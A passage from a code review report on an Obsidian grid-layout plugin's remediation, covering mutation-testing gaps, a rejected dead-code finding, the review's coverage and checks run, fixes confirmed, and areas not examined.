8. **The tests pass but pin little, and the mock diverges from the host.** All 231 tests pass, but about 45 mutants were tried, and those that survived show that the save path, the key-at-rest branches, Discard/Done, the grid guards, the id dedup and the inline-save guard are unpinned (M14, M119, M120, M121, M124, M125, M126, M127). The mock Component, the Setting builders and ColorComponent differ from Obsidian 1.13.7 (M122, M123), which is also what hid M10. CLAUDE.md's statement that the mock mirrors host behaviour holds only for the three behaviours it names.

## Rejected

**"Dead code: `LayoutPersister.isResponsive()` and an unreachable catch in `updateBlockConfig`"** (low, `src/grid/LayoutPersister.ts:122-125`, `src/main.ts:492-497`). Votes 1/3. The trace vote agreed that both facts hold. The refute and impact votes judged it not a defect, for three reasons:
- neither construct can execute, so no user-facing failure exists
- both predate the remediation
- both are already recorded, as X-ray TD-2 and in `docs/api/grid.md:560,1024`

It is a cleanup note at most.

## Coverage

**Reviewers.** Eight dimension reviewers read the remediation diff and most of `src/` against the working tree: correctness, persistence, security, lifecycle, performance, tests, architecture and platform. Three sweep rounds then ran targeted hunts:
- **Sweep 1:** tag matching, rendered Markdown, open modes, `openLinkText` semantics, auto-height against late content, gallery runtime.
- **Sweep 2:** unsaved inline state, external service contracts, defects recorded in `docs/`, edit mode in a real browser, single-column view.
- **Sweep 3:** time boundaries, stored vault paths, note-text extraction, per-key defaults and ranges, block styling across themes, the hidden leaf.

**Checks run:**
- `npx tsc --noEmit`: 0 errors.
- `npx vitest run`: 231/231 pass.
- `npx eslint src`: clean.
- About 45 mutants.
- A 20,000-input fuzz of `validateLayout`: no throws.

**Evidence sources.** Host behaviour came from the installed Obsidian 1.13.7 core. Many findings were reproduced in headless Chromium (Playwright) or a copy of Obsidian's Electron 39 runtime, with the real modules, GridStack 12.4.2 and `styles.css`. Provider documentation was fetched on 2026-09-27.

**Fixes confirmed correct:**
- RF-R1
- RF-R2 (with AP-1 and AP-8)
- RF-R3 (AP-2)
- RF-R4 and RF-R11
- RF-R5, RF-R6, RF-R16, RF-R20
- RF-S1, RF-S6
- AP-4, AP-5
- the `setEditMode` flush
- the keyless fast path in `persistableLayout`
- treating non-array blocks as corruption
- RF-S3, except for `undefined`-declared keys (M61)

**Not examined:**
- a live Obsidian instance, real iOS and Android devices, and popouts beyond code reading
- community themes and snippets
- `emojis.ts`
- the 10 block types that have no test file
- timing-only races with no practical trigger

**Repo safety.** The repo, `main.js` and `data.json` were not modified, and `data.json` was never read.